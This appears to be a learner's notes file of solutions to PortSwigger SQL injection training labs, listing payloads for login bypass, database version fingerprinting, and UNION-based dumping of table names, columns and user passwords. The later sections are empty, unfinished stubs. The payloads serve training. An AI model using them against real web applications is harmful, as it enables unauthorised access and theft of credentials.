# SQL injection


 * [sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


### Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

>**Q. SELECT * FROM products WHERE category = 'Gifts' AND released = 1 **

```sh
'+OR+1=1--
```

### Lab2: SQL injection vulnerability allowing login bypass
>**Q. To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. **

```sh
administrator'--
```
### Lab3: SQL injection attack, querying the database type and version on Oracle

```sh
'+UNION+SELECT+'abc','def'+FROM+dual--
```
```sh
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

### Lab4: SQL injection attack, querying the database type and version on MySQL and Microsoft

  ```sh
  order by 2#
  ```

  ```sh
  union select 1,2#
  ```

  ```sh
  union select 1,@@version#
  ```
### Lab5: SQL injection attack, listing the database contents on non-Oracle databases

  ```sh
  order by 2--
  ```
  ```sh
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
  ```
  ```sh
'+UNION+SELECT+column_name,table_name+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
  ```
  ```sh
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
  ```
### Lab: SQL injection attack, listing the database contents on Oracle
```sh
'+UNION+SELECT+'abc','def'+FROM+dual--
```
```sh

```

### 
```sh

```
```sh

```
###
```sh

```
```sh

```
